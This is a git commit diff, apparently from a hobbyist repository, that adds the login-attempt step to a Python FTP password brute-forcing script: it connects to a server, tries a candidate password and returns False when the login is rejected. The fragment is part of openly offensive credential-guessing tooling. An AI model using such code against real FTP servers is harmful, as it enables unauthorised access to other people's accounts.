73d03250c273eb67ede55da1f532c29e29b61abc
Nima Sayyah <81308966+Nima-Sayyah@users.noreply.github.com>
2022-06-07 23:50:43 +0100

    Update 3 - BF-FTP-S

--- Brute_Force_FTP_Server.py
+++ Brute_Force_FTP_Server.py
@@ -15,3 +15,12 @@ def is_correct(password):
     # initialize the FTP server object
     server = ftplib.FTP()
     print(f"[!] Trying", password)
+
+    try:
+        # tries to connect to FTP server with a timeout of 5
+        server.connect(host, port, timeout=5)
+        # login using the credentials (user & password)
+        server.login(user, password)
+    except ftplib.error_perm:
+        # login failed, wrong credentials
+        return False
